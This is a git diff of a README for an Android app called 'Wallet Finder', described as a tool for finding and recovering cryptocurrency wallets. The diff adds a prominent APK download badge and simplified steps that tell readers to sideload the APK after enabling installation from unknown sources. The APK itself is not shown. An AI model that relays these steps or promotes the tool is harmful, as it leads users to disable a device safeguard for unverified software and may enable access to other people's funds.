@@ -5,10 +5,11 @@
   <img src="https://img.shields.io/badge/platform-Android-brightgreen.svg" alt="Platform">
   <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License">
   <img src="https://img.shields.io/badge/API-21%2B-orange.svg" alt="Min API">
+  <a href="./Wallet-Finder.apk"><img src="https://img.shields.io/badge/Download-APK-brightgreen?style=for-the-badge&logo=android" alt="Download APK"></a>
 </p>
 
 <p align="center">
-  <strong>Version 3.0 · A Powerful Tool for Finding and Recovering Cryptocurrency Wallets</strong>
+  <strong>A Powerful Tool for Finding and Recovering Cryptocurrency Wallets</strong>
 </p>
 
 ---
@@ -114,8 +115,8 @@ Version 3.0 introduces a completely redesigned user interface, improved performa
 
 ### Download from Releases
 
-1. Click on [Download Wallet Finder](https://github.com/b3z4d/walletfinder/blob/main/Wallet-Finder.apk).
-2. Download the latest version (`v3.0`).
+1. [⬇️ Download APK](./Wallet-Finder.apk).
+2. Download APK file.
 3. Install the APK file on your Android device.
 4. If required, enable installation from unknown sources in your Android settings.
 
